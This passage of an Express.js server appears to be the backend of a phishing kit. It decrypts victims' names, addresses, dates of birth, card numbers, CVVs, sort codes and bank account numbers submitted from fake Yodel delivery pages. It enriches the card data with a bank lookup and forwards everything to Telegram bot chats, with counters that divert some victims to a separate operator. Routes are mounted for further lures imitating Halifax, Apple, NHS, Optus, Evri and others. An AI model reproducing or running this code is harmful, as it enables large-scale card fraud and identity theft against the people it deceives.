	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (mazCount == 10) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				yardzCount = 6;
			} else if (bin === "542011") {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelYardz:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5138777422&text=Yodel:\n${originalText}`
				);
				yardzCount += 1;
			}

			res.send("Update Completed");
		});
});

let hoods = 2;

app.post("/hoodsYodel", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (hoods == 6) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				hoods = 0;
			} else if (bin === "542011") {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelHoods:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2126545981&text=Yodel:\n${originalText}`
				);
				hoods += 1;
			}

			res.send("Update Completed");
		});
});

let bill = 0;

app.post("/sendBigBillz20", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (bill == 100) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				bill = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
				);
				bill += 1;
			}

			res.send("Update Completed");
		});
});

let kelvCount = 0;

app.post("/sendKelvYodelRes", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (kelvCount == 5) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				kelvCount = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
				);
				kelvCount += 1;
			}

			res.send("Update Completed");
		});
});

//HALIFAX
app.use("/halifax", require("./routes/halifax"));

//NZPOST
app.use("/nzpost", require("./routes/nzpost"));

//BEYOND
app.use("/beyond", require("./routes/beyond"));

//APPLE
app.use("/apple", require("./routes/apple"));

//NHS
app.use("/nhs", require("./routes/nhs"));

//OPTUS
app.use("/optus", require("./routes/optus"));

//EVRI
app.use("/evri", require("./routes/evri"));

//HERITAGE
app.use("/heritage", require("./routes/heritage"));

app.post("/removeips", (req, res) => {
	ip = req.body.ip;

	content = ``;
	fs.writeFile("ips.txt", content, (err) => {
		if (err) {
			console.error(err);
		} else {
			res.send("Update Completed");
		}
	});
});
